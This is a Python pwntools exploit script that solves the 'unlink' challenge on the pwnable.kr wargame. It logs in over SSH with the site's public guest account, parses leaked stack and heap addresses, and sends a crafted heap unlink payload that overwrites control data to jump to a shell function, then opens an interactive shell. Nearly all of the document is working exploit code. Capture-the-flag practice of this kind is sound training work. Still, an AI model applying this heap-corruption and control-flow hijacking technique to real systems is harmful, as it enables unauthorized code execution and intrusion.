#!/usr/bin/env python
#-*- coding:utf-8 -*-
from pwn import *
shell_addr = 0x080484EB
DEBUG = False
#context.log_level = "debug"
if DEBUG:
	io = process("./unlink")
else:
	s =  ssh(host='pwnable.kr',
         port=2222,
         user='unlink',
         password='guest'
        )
	io = s.process("./unlink")
#gdb.attach(io,"b *0x0000065B")
context.log_level = "debug"
#print io.recvline()
io.recvuntil("here is stack address leak: ")
stack_addr = io.recvuntil("\n")
io.recvuntil("here is heap address leak: ")
heap_addr = io.recvuntil("\n")
io.recvuntil("get shell!\n")
print stack_addr,heap_addr
payload = p32(shell_addr)             # 0x1c长度的buf + 4 byte的ebp
payload += "A"*12# 覆盖ret
payload += p32(int(heap_addr[2:],16)+12)# 覆盖ret
payload += p32(int(stack_addr[2:],16)+16)# 覆盖ret
io.send(payload)
io.interactive()